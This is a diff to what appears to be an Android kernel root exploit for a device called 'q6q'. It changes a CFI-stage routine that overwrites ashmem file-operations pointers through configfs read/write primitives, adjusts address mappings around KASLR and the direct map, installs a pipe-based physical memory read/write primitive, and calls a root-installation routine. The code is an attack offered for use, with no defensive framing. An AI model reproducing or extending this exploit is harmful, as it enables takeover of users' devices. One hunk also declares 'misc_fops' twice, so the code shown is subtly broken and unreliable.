@@ -353,6 +353,12 @@ int try_cfi_stage(void) {
     cfi_last_errno = errno;
     return 0;
   }
+
+  /* q6q v20 (kp18): the fops slot lives in the Image .data - address it via
+   * its CANONICAL text mapping; the linear alias is unmapped on q6q (direct
+   * map hole over the whole Image span).  The configfs read/write
+   * primitives copy through the kernel, so canonical targets work. */
+  uintptr_t misc_fops = text_addr(ASHMEM_MISC_FOPS);
   uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
   uint64_t pre_fops = 0;
   ssize_t pre_rb = configfs_read_once(
@@ -537,9 +543,16 @@ int try_cfi_stage(void) {
       }
 #endif
     }
-    if (install_child_root(fd)) {
-      installed = 1;
-      break;
+    /* q6q v21: the root daemon's p0-reference handoff requires a keeper
+     * process; the gate-verify flow (which normally spawns it) never runs
+     * on the FOPS path, so spawn the keeper here once the physrw is
+     * installed. */
+    if (install_pipe_physrw(fd)) {
+      spawn_p0_ref_keeper(pipebuf_pipe_idx);
+      if (install_android_root(fd)) {
+        installed = 1;
+        break;
+      }
     }
     if (pipe_cache_gate_ok && physrw_read_ok && physrw_write_ok &&
         physrw_read64_ok && physrw_write64_ok) {
@@ -577,7 +590,7 @@ int try_cfi_stage(void) {
 
 fail:
   if (dirty) {
-    uint64_t original_fops_fail = data_addr(ASHMEM_FOPS);
+    uint64_t original_fops_fail = text_addr(ASHMEM_FOPS);
     if (kaslr_done) {
       original_fops_fail = canon_addr(ASHMEM_FOPS);
     }
